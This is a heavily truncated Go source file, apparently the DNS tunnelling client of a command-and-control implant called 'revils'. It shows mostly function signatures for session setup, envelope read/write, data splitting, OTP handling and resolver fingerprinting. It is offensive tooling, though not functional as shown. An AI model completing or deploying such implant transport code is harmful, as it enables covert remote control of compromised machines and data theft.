...
import (
	...
	"github.com/Kevin-kitnick/revils/implant/revils/cryptography"
	"github.com/Kevin-kitnick/revils/implant/revils/encoders"
	"github.com/Kevin-kitnick/revils/protobuf/dnspb"
	pb "github.com/Kevin-kitnick/revils/protobuf/revilspb"
...
func DNSStartSession(parent string, opts *DNSOptions) (*RevilsDNSClient, error) {
	// {{if .Config.Debug}}
...
func NewDNSClient(parent string, opts *DNSOptions) *RevilsDNSClient {
	parent = strings.TrimSuffix("."+strings.TrimPrefix(parent, "."), ".") + "."
	return &RevilsDNSClient{
...
// RevilsDNSClient - The DNS client context
type RevilsDNSClient struct {
...
func (s *RevilsDNSClient) SessionInit() error {
...
func (s *RevilsDNSClient) sendInit(resolver DNSResolver, encoder encoders.Encoder, msg *dnspb.DNSMessage, data []byte) ([]byte, error) {
...
func (s *RevilsDNSClient) WriteEnvelope(envelope *pb.Envelope) error {
	if s.closed {
		return ErrClosed
	}
	// {{if .Config.Debug}}
...
func (s *RevilsDNSClient) ReadEnvelope() (*pb.Envelope, error) {
	if s.closed {
...
func (s *RevilsDNSClient) CloseSession() error {
	s.closed = true
...
func (s *RevilsDNSClient) parallelSend(data []byte) error {
	var encoder encoders.Encoder
...
func (s *RevilsDNSClient) parallelRecv(manifest *dnspb.DNSMessage) ([]byte, error) {
...
func (s *RevilsDNSClient) SplitBuffer(msg *dnspb.DNSMessage, encoder encoders.Encoder, data []byte) ([]string, error) {
	subdata := []string{}
	start := 0
	stop := start
	lastLen := 0
...
func (s *RevilsDNSClient) getDNSSessionID() error {
	otpMsg, err := s.otpMsg()
	if err != nil {
		return err
	}
...
func (s *RevilsDNSClient) loadResolvConf() error {
	var err error
...
func (s *RevilsDNSClient) joinSubdataToParent(subdata string) (string, error) {
...
func (s *RevilsDNSClient) pollMsg(meta *ResolverMetadata) (string, error) {
...
func (s *RevilsDNSClient) otpMsg() (string, error) {
...
func (s *RevilsDNSClient) fingerprintResolvers() {
	wg := &sync.WaitGroup{}
	// {{if .Config.Debug}}
...
func (s *RevilsDNSClient) fingerprintResolver(id int, wg *sync.WaitGroup, results chan<- *ResolverMetadata, resolver DNSResolver) {
	defer wg.Done()
...
func (s *RevilsDNSClient) benchmark(id int, encoder encoders.Encoder, resolver DNSResolver, meta *ResolverMetadata) {
...
func (s *RevilsDNSClient) fingerprintMsg(id int) ([]byte, uint32, error) {
	data := make([]byte, 8)
	rand.Read(data)
...
func (s *RevilsDNSClient) msgID(id uint32) uint32 {
	return uint32(id<<24) | uint32(s.dnsSessionID)
}

func (s *RevilsDNSClient) nextMsgID() uint32 {
	s.msgCount++
...
func (s *RevilsDNSClient) recordMetrics(meta *ResolverMetadata, rtt time.Duration) {
...
func (s *RevilsDNSClient) averageRtt(meta *ResolverMetadata) time.Duration {
...
func (s *RevilsDNSClient) randomResolver() (DNSResolver, *ResolverMetadata) {
